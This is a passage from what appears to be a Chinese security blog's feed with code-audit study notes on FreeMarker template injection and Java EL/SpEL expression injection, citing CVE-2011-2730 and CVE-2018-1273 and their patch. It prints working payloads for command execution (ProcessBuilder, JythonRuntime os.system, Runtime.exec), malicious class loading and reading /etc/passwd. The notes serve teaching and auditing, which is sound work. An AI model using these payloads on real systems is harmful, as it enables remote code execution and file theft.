class="language-java"><span class="token number">17</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ObjectConstructor</span> <span class="token keyword">implements</span> <span class="token class-name">TemplateMethodModelEx</span> <span class="token punctuation">&#123;</span><span class="token number">18</span>     <span class="token keyword">public</span> <span class="token class-name">ObjectConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">19</span>     <span class="token punctuation">&#125;</span><span class="token number">20</span> <span class="token number">21</span>     <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token class-name">List</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TemplateModelException</span> <span class="token punctuation">&#123;</span><span class="token number">22</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">23</span>             <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TemplateModelException</span><span class="token punctuation">(</span><span class="token string">"This method must have at least one argument, the name of the class to instantiate."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">24</span>         <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token number">25</span>             <span class="token class-name">String</span> classname <span class="token operator">=</span> args<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">26</span>             <span class="token class-name">Class</span> cl <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token number">27</span> <span class="token number">28</span>             <span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token number">29</span>                 cl <span class="token operator">=</span> <span class="token class-name">ClassUtil</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>classname<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">30</span>             <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var6<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">31</span>                 <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TemplateModelException</span><span class="token punctuation">(</span>var6<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">32</span>             <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造 Payload 如下：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#assign</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>freemarker.template.utility.ObjectConstructor<span class="token punctuation">"</span></span><span class="token attr-name">?new()</span><span class="token punctuation">></span></span>$&#123;value("java.lang.ProcessBuilder","open","-a","Calculator").start()&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112032001213.png"></p><h3 id="利用方法三："><a href="#利用方法三：" class="headerlink" title="利用方法三："></a>利用方法三：</h3><p>freemarker.template.utility 里有个 JythonRuntime 类，这里可以通过自定义标签的方式执行 Python 命令，从而构造远程命令执行。</p><p>freemarker.template.utility.JythonRuntime 部分文件代码如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JythonRuntime</span> <span class="token keyword">extends</span> <span class="token class-name">PythonInterpreter</span>    <span class="token keyword">implements</span> <span class="token class-name">TemplateTransformModel</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">Writer</span> <span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">Writer</span> out<span class="token punctuation">,</span>                            <span class="token keyword">final</span> <span class="token class-name">Map</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">final</span> <span class="token class-name">StringBuilder</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token class-name">Environment</span> env <span class="token operator">=</span> <span class="token class-name">Environment</span><span class="token punctuation">.</span><span class="token function">getCurrentEnvironment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Writer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">char</span> cbuf<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> off<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                buf<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>cbuf<span class="token punctuation">,</span> off<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>                <span class="token function">interpretBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">interpretBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">interpretBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token class-name">JythonRuntime</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token class-name">PyObject</span> prevOut <span class="token operator">=</span> systemState<span class="token punctuation">.</span>stdout<span class="token punctuation">;</span>                    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                        <span class="token function">setOut</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"env"</span><span class="token punctuation">,</span> env<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token function">exec</span><span class="token punctuation">(</span>buf<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        buf<span class="token punctuation">.</span><span class="token function">setLength</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>                        <span class="token function">setOut</span><span class="token punctuation">(</span>prevOut<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造 Payload 如下：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#assign</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>freemarker.template.utility.JythonRuntime<span class="token punctuation">"</span></span><span class="token attr-name">?new()</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>@value</span><span class="token punctuation">></span></span>import os;os.system("open -a Calculator")<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>@value</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112032001223.png"></p><h2 id="2、api-函数的利用"><a href="#2、api-函数的利用" class="headerlink" title="2、api 函数的利用"></a>2、api 函数的利用</h2><p>除了 new 函数，还可以利用 api 函数调用 Java API，然后通过 getClassLoader 获取类加载器从而加载恶意类，或者也可以通过 getResource 来实现任意文件读取。</p><p>加载恶意类的 Payload 如下：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#assign</span> <span class="token attr-name">classLoader</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>object?api.class.getClassLoader()</span><span class="token punctuation">></span></span>$&#123;classLoader.loadClass("Evil.class")&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>任意文件读取的 Payload 如下：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">&lt;#assign uri=object?api.class.getResource("/").toURI()>  &lt;#assign input=uri?api.create("file:///etc/passwd").toURL().openConnection()>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#assign</span> <span class="token attr-name">is</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>input?api.getInputStream()</span><span class="token punctuation">></span></span>  FILE:[<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#list</span> <span class="token attr-name">0..999999999</span> <span class="token attr-name">as</span> <span class="token attr-name">_</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#assign</span> <span class="token attr-name">byte</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>is.read()</span><span class="token punctuation">></span></span>      &lt;#if byte == -1>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#break</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>#if</span><span class="token punctuation">></span></span>  $&#123;byte&#125;, <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>#list</span><span class="token punctuation">></span></span>]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不过 api 内建函数并不能随便使用，必须在配置项 apiBuiltinEnabled 为 true 时才有效，而该配置在 2.3.22 版本之后默认为 false</p><p>同时 FreeMarker 为了防御通过其他方式调用恶意方法，FreeMarker 内置了一份危险方法名单 unsafeMethods.properties，例如 getClassLoader、newInstance 等危险方法都被禁用了。</p><blockquote><p>参考文章：</p><p><a href="https://www.anquanke.com/post/id/215348">https://www.anquanke.com/post/id/215348</a></p><p><a href="https://www.cnblogs.com/Eleven-Liu/p/12747908.html">https://www.cnblogs.com/Eleven-Liu/p/12747908.html</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-介绍&quot;&gt;&lt;a href=&quot;#0x00-介绍&quot; class=&quot;headerlink&quot; title=&quot;0x00 介绍&quot;&gt;&lt;/a&gt;0x00 介绍&lt;/h1&gt;&lt;p&gt;这里主要学习下 FreeMarker 模板注入，FreeMarker 是一款模板引擎，FreeMar</summary>
      
    
    
    
    <category term="代码审计" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="代码审计" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>【代码审计】表达式注入</title>
    <link href="https://www.teamssix.com/211129-180558.html"/>
    <id>https://www.teamssix.com/211129-180558.html</id>
    <published>2021-11-29T10:05:58.000Z</published>
    <updated>2021-11-29T10:23:05.294Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>表达式语言（Expression Language）简称 EL 表达式，是一种 JSP 内置的语言。</p><p>在 JSP 中，使用 ${} 来表示 EL 表达式，例如 ${name} 表示获取 name 变量。</p><p>在 EL 表达式中有两种获取对象属性的方法，第一种为 ${param.name}，第二种为 ${param[name]}</p><h2 id="2、实例"><a href="#2、实例" class="headerlink" title="2、实例"></a>2、实例</h2><h3 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h3><p>使用 param 对象获取用户传入的参数值，这里的 ${param.name} 相当于 request.getParameter(“name”)</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html; charset=UTF-8"</span> pageEncoding<span class="token operator">=</span><span class="token string">"UTF-8"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">></span><span class="token generics"><span class="token punctuation">&lt;</span>html<span class="token punctuation">></span></span><span class="token generics"><span class="token punctuation">&lt;</span>head<span class="token punctuation">></span></span>    <span class="token generics"><span class="token punctuation">&lt;</span>title<span class="token punctuation">></span></span>EL 表达式实例页面<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span><span class="token generics"><span class="token punctuation">&lt;</span>body<span class="token punctuation">></span></span><span class="token generics"><span class="token punctuation">&lt;</span>h3<span class="token punctuation">></span></span>输入的 name 值为：$<span class="token punctuation">&#123;</span>param<span class="token punctuation">.</span>name<span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h3<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样当我们访问 <a href="http://xxx:8080/xxx/?name=teamssix">http://xxx:8080/xxx/?name=teamssix</a> 的时候，页面就会返回「输入的 name 值为：teamssix」</p><p>EL 表达式也可以实例化 Java 的内置类，比如 Runtime.class 会执行系统命令</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html; charset=UTF-8"</span> pageEncoding<span class="token operator">=</span><span class="token string">"UTF-8"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">></span><span class="token generics"><span class="token punctuation">&lt;</span>html<span class="token punctuation">></span></span><span class="token generics"><span class="token punctuation">&lt;</span>head<span class="token punctuation">></span></span>    <span class="token generics"><span class="token punctuation">&lt;</span>title<span class="token punctuation">></span></span>EL 表达式实例页面<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span><span class="token generics"><span class="token punctuation">&lt;</span>body<span class="token punctuation">></span></span>$<span class="token punctuation">&#123;</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当执行该页面代码时，就可以看到计算器被弹出来了，不过前提是 Tomcat 被部署在 Windows 下，如果在 Linux 下则需要将 calc 换成其他命令，不然会报错 500</p><h3 id="Spring-标签-EL-表达式漏洞（CVE-2011-2730）"><a href="#Spring-标签-EL-表达式漏洞（CVE-2011-2730）" class="headerlink" title="Spring 标签 EL 表达式漏洞（CVE-2011-2730）"></a>Spring 标签 EL 表达式漏洞（CVE-2011-2730）</h3><p>在历史上出现过一个 Spring 标签 EL 表达式漏洞（CVE-2011-2730），Spring 表达式语言（SpEL）是一种与 EL 功能类似的表达式语言。</p><p>在未对用户的输入做严格检查并且错误的使用 Spring 表达式语言时就可能产生表达式注入漏洞。</p><p>在 SpEL 的 Evaluation 接口中，有两个实现方法，分别为 SimpleEvaluationContext 和 StandardEvaluationContext 方法，其中前者权限比较小，后者权限比较大，因此当使用 StandardEvaluation 方法时，就可以利用 Runtime.class 方法执行命令，例如以下代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">EvaluationContext</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>support<span class="token punctuation">.</span></span><span class="token class-name">StandardEvaluationContext</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpEL</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">mian</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> expressionstr <span class="token operator">=</span> <span class="token string">"T(Runtime).getRuntime().exec(\"open -a Calculator\")"</span><span class="token punctuation">;</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">EvaluationContext</span> evaluationContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StandardEvaluationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Expression</span> expression <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>expressionstr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>expression<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span>evaluationContext<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Spring-Data-Commons-远程代码执行漏洞（CVE-2018-1273）"><a href="#Spring-Data-Commons-远程代码执行漏洞（CVE-2018-1273）" class="headerlink" title="Spring Data Commons 远程代码执行漏洞（CVE-2018-1273）"></a>Spring Data Commons 远程代码执行漏洞（CVE-2018-1273）</h3><p>对于 2018 年出的 Spring Data Commons RCE 漏洞，RT 可以通过构造 SpEL 表达式实现 RCE</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202111291811883.png"></p><p>通过观察官方补丁，可以发现正是将原来的 StandardEvaluationContext 方法换成了 SimpleEvaluationContext 方法。</p><p>补丁地址：<a href="https://github.com/spring-projects/spring-data-commons/commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a?diff=unified#">https://github.com/spring-projects/spring-data-commons/commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a</a></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">175</span> <span class="token operator">-</span> <span class="token class-name">StandardEvaluationContext</span> context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StandardEvaluationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">180 + EvaluationContext context &#x3D; SimpleEvaluationContext<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>参考文章：</p><p><a href="https://blog.csdn.net/lup7in/article/details/8659408">https://blog.csdn.net/lup7in/article/details/8659408</a></p><p><a href="https://misakikata.github.io/2018/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">https://misakikata.github.io/2018/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、介绍&quot;&gt;&lt;a href=&quot;#1、介绍&quot; class=&quot;headerlink&quot; title=&quot;1、介绍&quot;&gt;&lt;/a&gt;1、介绍&lt;/h2&gt;&lt;p&gt;表达式语言（Expression Language）简称 EL 表达式，是一种 JSP 内置的语言。&lt;/p&gt;
&lt;p&gt;在 JS</summary>
      
    
    
    
    <category term="代码审计" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="代码审计" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
</feed>
